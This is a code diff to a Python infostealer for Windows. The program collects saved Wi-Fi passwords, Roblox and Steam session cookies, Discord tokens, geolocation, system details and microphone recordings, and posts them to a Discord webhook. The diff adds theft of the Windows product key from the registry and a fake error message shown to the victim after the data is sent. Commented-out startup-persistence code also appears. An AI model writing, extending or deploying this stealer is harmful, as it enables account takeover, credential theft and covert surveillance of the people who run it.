@@ -1,5 +1,5 @@
 #Import libraries
-from discord_webhook import DiscordWebhook, DiscordEmbed
+from discord_webhook import DiscordEmbed, DiscordWebhook
 import browser_cookie3
 import subprocess
 import json
@@ -28,8 +28,11 @@ import numpy as np
 import wavio
 import threading
 import ctypes
+import winreg as wrg
 
-webhookurl='YourWebhookUrlHere'
+
+
+webhookurl='webhook'
 userhome = os.path.expanduser('~')
 folderdir=os.path.join(userhome,'Data')
 startfolder = os.path.join(userhome, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
@@ -78,17 +81,17 @@ def ip6():#get ipv6
        ip=requests.get('https://6.tnedi.me')
        return ip.text
     except:
-        return []
+        return None
 def wifipass():
     try:
      data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('cp949').split('\n')
     except subprocess.CalledProcessError: 
-        return []
+        return None
     profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
     wifi_info = {}
 
     if not profiles:
-        return []
+        return None
 
     for i in profiles:
         results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('cp949').split('\n')
@@ -154,7 +157,7 @@ def edge_logger():
         return rcookie
     except Exception as e:
         print(f"Error occurred in edge_logger: {str(e)}")
-        return []
+        return None
 def chrome_logger():
     try:
         rcookies = browser_cookie3.chrome(domain_name='roblox.com')
@@ -164,7 +167,7 @@ def chrome_logger():
         return rcookie
     except Exception as e:
         print(f"Error occurred in chrome_logger: {str(e)}")
-        return []
+        return None
 def firefox_logger():
     try:
         rcookies = browser_cookie3.firefox(domain_name='roblox.com')
@@ -174,7 +177,7 @@ def firefox_logger():
         return rcookie
     except Exception as e:
         print(f"Error occurred in firefox_logger: {str(e)}")
-        return []
+        return None
 def opera_logger():
     try:
         cookies = browser_cookie3.opera(domain_name='roblox.com')
@@ -183,7 +186,7 @@ def opera_logger():
         return cookie
     except Exception as e:
         print(f"Error occurred in opera_logger: {str(e)}")
-        return []  
+        return None  
 roblochrome,robloedge,roblofire,robloopera=chrome_logger(),edge_logger(),firefox_logger(),opera_logger()
 
 def edge_steam():
@@ -768,6 +771,36 @@ def discordinfo():
     except:
         pass        
     
+
+def windowsproductkey():
+    # Store location of HKEY_LOCAL_MACHINE
+    location = wrg.HKEY_LOCAL_MACHINE
+
+    # Define the registry path
+    registry_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform"
+
+    try:
+        # Open the registry key
+        soft = wrg.OpenKeyEx(location, registry_path)
+
+        # Reading values
+        key = wrg.QueryValueEx(soft, "BackupProductKeyDefault")
+
+        # Close the registry key
+        wrg.CloseKey(soft)
+
+        # Printing values
+        return key[0]
+
+    except FileNotFoundError:
+        print(f"The specified path '{registry_path}' is not found in the Windows Registry.")
+        return None
+    except Exception as e:
+        print(f"An error occurred: {e}")
+        return None
+
+
+
     
     
    
@@ -778,7 +811,7 @@ micthread=threading.Thread(target=record_audio)
 wifiembed=DiscordEmbed(title='Saved Wifi',description=f'```{wifi}```',color='60cc88')
 geolocationembed=DiscordEmbed(title='Geolocation Data',description=f'```Latitude: {lat}```\n```Longitude: {long}```\n```City: {city}```\n```Region: {region}```\n```Country: {country}```\n```Postal Code: {postal}```\n```Timezone: {timezone}```\n```Router Orginisation: {org}```\n```Router Hostname: {hostname}```',color='fcba03')
 robloxembed=DiscordEmbed(title='Roblox Cookies',description=f'Opera:```{robloopera}```\nChrome:```{roblochrome}```\nEdge:```{robloedge}```\nFirefox:```{roblofire}```',color='6f00ff')
-sysembed=DiscordEmbed(title='System Information',description=f'```Hostname: {info["Hostname"]}```\n```IPv4: {ip4}```\n```IPv6: {ip6()}```\n```Proccessor: {info["Processor"]}```\n```Ram: {info["RAM"]}```\n```Machine: {info["Machine"]}```\n```Architecture: {info["Architecture"]}```\n```OS: {info["OS"]}```\n```OS-Release: {info["OS-release"]}```\n```OS-Version: {info["OS-version"]}```\n```Mac-Address: {info["Mac-Address"]}```',color='ab222b')
+sysembed=DiscordEmbed(title='System Information',description=f'```Hostname: {info["Hostname"]}```\n```IPv4: {ip4}```\n```IPv6: {ip6()}```\n```Windows Product Key: {windowsproductkey()}```\n```Proccessor: {info["Processor"]}```\n```Ram: {info["RAM"]}```\n```Machine: {info["Machine"]}```\n```Architecture: {info["Architecture"]}```\n```OS: {info["OS"]}```\n```OS-Release: {info["OS-release"]}```\n```OS-Version: {info["OS-version"]}```\n```Mac-Address: {info["Mac-Address"]}```',color='ab222b')
 steamloginembed = DiscordEmbed(title='steamLoginSecure Cookies',description=f'Opera:```{opera_steam_cookie}```\nChrome:```{chrome_steam_cookie}```\nEdge:```{edge_steam_cookie}```\nFirefox:```{firefox_steam_cookie}```',color='4e6cd9')
 steamsesembed = DiscordEmbed(title='Steam sessionid cookies',description=f'Opera:```{opera_session_cookie}```\nChrome:```{chrome_session_cookie}```\nEdge:```{edge_session_cookie}```\nFirefox:```{firefox_session_cookie}```',color='4e6cd9')
 discordtokenembed= DiscordEmbed(title='Discord Token(s)',description='# Tokens:\n')
@@ -825,6 +858,7 @@ micthread.join()
 
 remove_all_zip_files(os.path.dirname(sys.executable))    
 webhook.execute()
+ctypes.windll.user32.MessageBoxW(0, "Error 99: Please try again later", "An error as occured", 1)
 #if not os.path.realpath(sys.executable) == startup_script_path:
 #    copy_to_startup()
 #    webhook.execute()
